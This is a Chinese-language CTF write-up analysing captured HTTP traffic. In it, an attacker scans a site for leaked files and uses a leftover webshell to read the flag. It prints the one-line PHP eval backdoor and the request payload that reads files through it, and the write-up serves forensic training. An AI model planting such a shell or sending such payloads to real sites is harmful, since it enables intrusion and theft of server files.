
#### 攻击流量分析
该题目目的在于考察选手对常见的WEB攻击手法的了解程度
该题目场景为: 
```
某黑客对网站进行敏感信息泄露扫描然后发现别的黑客遗留的后门之后进行利用, 获取 flag
```
打开流量包过滤 HTTP 请求
![image.png](http://upload-images.jianshu.io/upload_images/2355077-5097827cd84f68b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
黑客首先进行了敏感信息泄露的扫描, 因此响应码中必然会有很多 404, 这些流量并没有用, 因此过滤掉
![image.png](http://upload-images.jianshu.io/upload_images/2355077-379bb7becf282b6a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
得到四条可能有用的流量包
查看对应请求如下: 
![image.png](http://upload-images.jianshu.io/upload_images/2355077-7a65cb5f5ed85629.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)
明显为对 `webshell` 的利用, 其密码为 `c`
```
c=print_r(gzcompress(file_get_contents(base64_decode('aW5kZXgucGhw'))));
```
将 flag 内容获取后进行了 gzip 压缩, 然后显示在响应体中

```
➜  ~ python
Python 2.7.12 (default, Dec  4 2017, 14:50:18) 
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> "789cb3b12fc82850482d4bccd150890f720d0c750d0e894e8ed5b4b6b7e3020081de0866".decode("hex")
'x\x9c\xb3\xb1/\xc8(PH-K\xcc\xd1P\x89\x0fr\r\x0cu\r\x0e\x89N\x8e\xd5\xb4\xb6\xb7\xe3\x02\x00\x81\xde\x08f'
>>> __import__("zlib").decompress("789cb3b12fc82850482d4bccd150890f720d0c750d0e894e8ed5b4b6b7e3020081de0866".decode("hex"))
'<?php eval($_REQUEST[c]);?>\n'
>>> __import__("zlib").decompress("789ccbc82c492e49abb6304d32484c354eb4483437b048b234324f4a334c343648494b334e36333531a8e5020018cb0c6c".decode("hex"))
'hitctf{85b0ae3a8a708b927bf1a30dff3c6540}\n'
```
